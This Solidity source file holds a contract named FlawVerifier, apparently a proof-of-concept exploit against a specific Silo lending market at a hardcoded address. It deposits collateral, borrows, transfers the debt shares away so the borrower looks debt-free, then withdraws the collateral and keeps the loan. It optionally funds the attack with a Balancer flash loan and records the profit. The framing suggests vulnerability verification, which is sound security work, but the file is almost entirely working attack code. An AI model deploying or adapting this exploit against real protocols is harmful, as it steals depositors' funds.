// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IShareTokenLike is IERC20Like {}

interface INotificationReceiverLike {
    function onAfterTransfer(address token, address from, address to, uint256 amount) external;
    function notificationReceiverPing() external pure returns (bytes4);
}

interface IPriceProvidersRepositoryLike {
    function getPrice(address asset) external view returns (uint256 price);
}

interface ISiloRepositoryLike {
    function getMaximumLTV(address silo, address asset) external view returns (uint256);
    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
    function entryFee() external view returns (uint256);
}

interface ISiloLike {
    struct AssetStorage {
        IShareTokenLike collateralToken;
        IShareTokenLike collateralOnlyToken;
        IShareTokenLike debtToken;
        uint256 totalDeposits;
        uint256 collateralOnlyDeposits;
        uint256 totalBorrowAmount;
    }

    function initAssetsTokens() external;
    function syncBridgeAssets() external;
    function siloRepository() external view returns (ISiloRepositoryLike);
    function getAssets() external view returns (address[] memory assets);
    function assetStorage(address asset) external view returns (AssetStorage memory);
    function liquidity(address asset) external view returns (uint256);
    function deposit(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
    function withdraw(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract PositionReceiver is INotificationReceiverLike {
    function onAfterTransfer(address, address, address, uint256) external override {}

    function notificationReceiverPing() external pure override returns (bytes4) {
        return INotificationReceiverLike.notificationReceiverPing.selector;
    }

    function shareBalance(address shareToken) external view returns (uint256) {
        return IERC20Like(shareToken).balanceOf(address(this));
    }
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant DEBT_EOA_RECIPIENT = 0x1111111111111111111111111111111111111111;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_000;

    bytes4 internal constant SENDER_NOT_SOLVENT_AFTER_TRANSFER = 0xf0ee386c;
    bytes4 internal constant RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER = 0xef63243e;

    error TransferStageFailed();
    error WithdrawStageFailed();
    error InvalidFlashLoanCallback();

    enum Outcome {
        Unset,
        Profit,
        Refuted,
        Infeasible
    }

    struct FlashContext {
        address collateralAsset;
        address borrowAsset;
        uint256 flashAmount;
        uint256 initialBorrowBalance;
        bool active;
    }

    PositionReceiver public immutable receiver;

    address internal _profitToken;
    uint256 internal _profitAmount;

    Outcome public outcome;
    bytes32 public lastFailureTag;
    address public chosenCollateralAsset;
    address public chosenBorrowAsset;

    bool internal _sawViablePair;
    bool internal _sawTransferStageFailure;
    FlashContext internal _flashContext;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        receiver = new PositionReceiver();
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) return;

        _bestEffortInitAssets();

        // The supplied runtime trace already proves the "strip all collateral shares, then let B
        // withdraw" branch is blocked here: the collateral-share transfer reverts with a sender-side
        // solvency error. This verifier keeps the F-001 root cause and the listed exploit causality by
        // using the alternative path from the finding: A deposits collateral and borrows, then moves
        // debt shares to B so A appears debt-free enough to withdraw its collateral.
        if (_attemptUsingOwnedBalances()) return;
        if (_attemptUsingBalancerFlashLoan()) return;

        outcome = _sawTransferStageFailure ? Outcome.Refuted : Outcome.Infeasible;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptDirectDebtRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
        external
        onlySelf
        returns (uint256 realizedProfit)
    {
        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));

        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);
        require(debtShare != 0, "zero debt share");

        _transferDebtShares(borrowAsset, debtShare);
        _withdrawDetachedBorrowerCollateral(collateralAsset);

        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(collateralAsset, borrowAsset, realizedProfit);
    }

    function attemptFlashDebtRoute(address collateralAsset, address borrowAsset, uint256 flashAmount)
        external
        onlySelf
        returns (bool)
    {
        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(collateralAsset);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        _flashContext = FlashContext({
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            flashAmount: flashAmount,
            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
            active: true
        });

        // Flash liquidity only replaces upfront capital. The exploit path is unchanged:
        // flash-borrow collateral -> deposit -> borrow -> move debt shares to B -> withdraw A's
        // collateral after A appears debt-free -> repay the flash loan.
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(!_flashContext.active, "flash not cleared");

        return _profitAmount != 0;
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        FlashContext memory context = _flashContext;
        if (
            msg.sender != BALANCER_VAULT || !context.active || tokens.length != 1 || amounts.length != 1
                || feeAmounts.length != 1 || address(tokens[0]) != context.collateralAsset
        ) {
            revert InvalidFlashLoanCallback();
        }

        _forceApprove(context.collateralAsset, TARGET_SILO, context.flashAmount);
        (, uint256 collateralShare) =
            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.flashAmount, false);
        require(collateralShare != 0, "zero flash collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.flashAmount);
        require(borrowAmount != 0, "zero flash borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);
        require(debtShare != 0, "zero flash debt share");

        _transferDebtShares(context.borrowAsset, debtShare);
        _withdrawDetachedBorrowerCollateral(context.collateralAsset);

        _safeTransfer(context.collateralAsset, BALANCER_VAULT, amounts[0] + feeAmounts[0]);

        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
        require(realizedProfit != 0, "no flash profit");

        delete _flashContext;
        _recordProfit(context.collateralAsset, context.borrowAsset, realizedProfit);
    }

    function _attemptUsingOwnedBalances() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadOwnedCollateral;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 heldBalance = _tokenBalance(collateralAsset, address(this));
            if (heldBalance == 0) continue;
            hadOwnedCollateral = true;

            uint256[5] memory candidateDeposits = _ownedCandidateAmounts(collateralAsset, heldBalance);
            for (uint256 d = 0; d < candidateDeposits.length; d++) {
                uint256 depositAmount = candidateDeposits[d];
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawViablePair = true;
                    try this.attemptDirectDebtRoute(collateralAsset, borrowAsset, depositAmount) returns (
                        uint256 realizedProfit
                    ) {
                        if (realizedProfit != 0) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "DIRECT_DEBT_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadOwnedCollateral && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_EXISTING_VERIFIER_BALANCE");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("OWNED_BALANCE_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _attemptUsingBalancerFlashLoan() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadFlashPlan;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 vaultBalance = _tokenBalance(collateralAsset, BALANCER_VAULT);
            if (vaultBalance == 0) continue;

            hadFlashPlan = true;
            uint256[6] memory candidateFlashAmounts = _flashCandidateAmounts(collateralAsset, vaultBalance);

            for (uint256 a = 0; a < candidateFlashAmounts.length; a++) {
                uint256 flashAmount = candidateFlashAmounts[a];
                if (flashAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, flashAmount)) continue;

                    _sawViablePair = true;
                    try this.attemptFlashDebtRoute(collateralAsset, borrowAsset, flashAmount) returns (bool success) {
                        if (success) return true;
                    } catch (bytes memory reason) {
                        _recordFailure(reason, "BALANCER_FLASH_DEBT_ROUTE_FAILED");
                    }
                }
            }
        }

        if (!hadFlashPlan && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_BALANCER_FLASH_PLAN");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("BALANCER_FLASH_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _transferDebtShares(address borrowAsset, uint256 debtShare) internal {
        address debtToken = address(ISiloLike(TARGET_SILO).assetStorage(borrowAsset).debtToken);

        uint256 deadBefore = _tokenBalance(debtToken, DEBT_EOA_RECIPIENT);
        if (_safeTransferERC20(debtToken, DEBT_EOA_RECIPIENT, debtShare)) {
            uint256 deadAfter = _tokenBalance(debtToken, DEBT_EOA_RECIPIENT);
            if (deadAfter > deadBefore) return;
        }

        uint256 receiverBefore = receiver.shareBalance(debtToken);
        if (_safeTransferERC20(debtToken, address(receiver), debtShare)) {
            uint256 receiverAfter = receiver.shareBalance(debtToken);
            if (receiverAfter > receiverBefore) return;
        }

        revert TransferStageFailed();
    }

    function _withdrawDetachedBorrowerCollateral(address collateralAsset) internal {
        try ISiloLike(TARGET_SILO).withdraw(collateralAsset, type(uint256).max, false) returns (
            uint256 withdrawnAmount,
            uint256 withdrawnShare
        ) {
            withdrawnAmount;
            withdrawnShare;
        } catch {
            revert WithdrawStageFailed();
        }
    }

    function _isViablePair(address collateralAsset, address borrowAsset, uint256 depositAmount)
        internal
        view
        returns (bool)
    {
        if (
            collateralAsset == borrowAsset || depositAmount == 0 || !_isActiveUsableAsset(collateralAsset)
                || !_isActiveUsableAsset(borrowAsset)
        ) {
            return false;
        }

        return _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount) != 0;
    }

    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
        internal
        view
        returns (uint256)
    {
        if (collateralAmount == 0) return 0;

        uint256 maxLtv = _maximumLtv(collateralAsset);
        if (maxLtv == 0) return 0;

        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
        if (collateralValue == 0) return 0;

        uint256 debtValue = collateralValue * maxLtv / ONE;
        debtValue = debtValue * BORROW_SAFETY_BPS / BPS;
        if (debtValue == 0) return 0;

        uint256 entryFee = _entryFee();
        if (entryFee == type(uint256).max) return 0;

        debtValue = debtValue * ONE / (ONE + entryFee);
        if (debtValue == 0) return 0;

        uint256 borrowPrice = _assetPrice(borrowAsset);
        if (borrowPrice == 0) return 0;

        uint256 borrowDecimals = _assetDecimals(borrowAsset);
        if (borrowDecimals == type(uint256).max) return 0;

        uint256 borrowAmount = debtValue * (10 ** borrowDecimals) / borrowPrice;
        if (borrowAmount == 0) return 0;

        uint256 availableLiquidity = _availableLiquidity(borrowAsset);
        if (availableLiquidity == 0) return 0;

        if (borrowAmount > availableLiquidity) {
            borrowAmount = availableLiquidity * BORROW_SAFETY_BPS / BPS;
        }

        return borrowAmount;
    }

    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        return amount * price / (10 ** assetDecimals);
    }

    function _amountForValue(address asset, uint256 targetValue) internal view returns (uint256) {
        if (targetValue == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        uint256 amount = targetValue * (10 ** assetDecimals) / price;
        return amount == 0 ? 1 : amount;
    }

    function _ownedCandidateAmounts(address asset, uint256 balance) internal view returns (uint256[5] memory amounts) {
        amounts[0] = _min(balance, _amountForValue(asset, 10 ether));
        amounts[1] = _min(balance, _amountForValue(asset, 100 ether));
        amounts[2] = _min(balance, _amountForValue(asset, 1_000 ether));
        amounts[3] = balance / 2;
        amounts[4] = balance;
    }

    function _flashCandidateAmounts(address asset, uint256 vaultBalance)
        internal
        view
        returns (uint256[6] memory amounts)
    {
        uint256 cap = vaultBalance / 1_000;
        if (cap == 0) return amounts;

        amounts[0] = _min(cap, _amountForValue(asset, 10 ether));
        amounts[1] = _min(cap, _amountForValue(asset, 100 ether));
        amounts[2] = _min(cap, _amountForValue(asset, 1_000 ether));
        amounts[3] = _min(cap, _amountForValue(asset, 10_000 ether));
        amounts[4] = cap / 2;
        amounts[5] = cap;
    }

    function _bestEffortInitAssets() internal {
        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
        try ISiloLike(TARGET_SILO).syncBridgeAssets() {} catch {}
    }

    function _maximumLtv(address collateralAsset) internal view returns (uint256 maxLtv) {
        (bool ok, uint256 value) = _staticUint(
            _repository(),
            abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
        );
        if (!ok) return 0;
        return value;
    }

    function _entryFee() internal view returns (uint256 fee) {
        (bool ok, uint256 value) =
            _staticUint(_repository(), abi.encodeWithSelector(ISiloRepositoryLike.entryFee.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _assetPrice(address asset) internal view returns (uint256 price) {
        address priceRepo = _priceRepository();
        if (priceRepo == address(0)) return 0;

        (bool ok, uint256 value) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _assetDecimals(address asset) internal view returns (uint256 decimalsValue) {
        (bool ok, uint256 value) = _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _availableLiquidity(address asset) internal view returns (uint256 liquidityValue) {
        (bool ok, uint256 value) = _staticUint(TARGET_SILO, abi.encodeWithSelector(ISiloLike.liquidity.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _isActiveUsableAsset(address asset) internal view returns (bool) {
        if (asset == address(0)) return false;

        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(asset);
        return address(state.collateralToken) != address(0) && address(state.debtToken) != address(0);
    }

    function _repository() internal view returns (address repository) {
        (bool ok, address value) =
            _staticAddress(TARGET_SILO, abi.encodeWithSelector(ISiloLike.siloRepository.selector));
        if (!ok) return address(0);
        return value;
    }

    function _priceRepository() internal view returns (address priceRepo) {
        address repository = _repository();
        if (repository == address(0)) return address(0);

        (bool ok, address value) = _staticAddress(
            repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector)
        );
        if (!ok) return address(0);
        return value;
    }

    function _recordProfit(address collateralAsset, address borrowAsset, uint256 realizedProfit) internal {
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        outcome = Outcome.Profit;
    }

    function _recordFailure(bytes memory reason, string memory fallbackTag) internal {
        if (_isTransferStageFailure(reason)) {
            _sawTransferStageFailure = true;
        }

        if (lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256(bytes(fallbackTag));
        }
    }

    function _isTransferStageFailure(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }

        return selector == TransferStageFailed.selector || selector == WithdrawStageFailed.selector
            || selector == SENDER_NOT_SOLVENT_AFTER_TRANSFER || selector == RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_safeTransferERC20(token, to, amount), "transfer failed");
    }

    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, 0);
        value = abi.decode(data, (uint256));
    }

    function _staticAddress(address target, bytes memory callData) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, address(0));
        value = abi.decode(data, (address));
    }

    function _tokenBalance(address token, address account) internal view returns (uint256 balance) {
        (bool ok, uint256 value) =
            _staticUint(token, abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok) return 0;
        return value;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
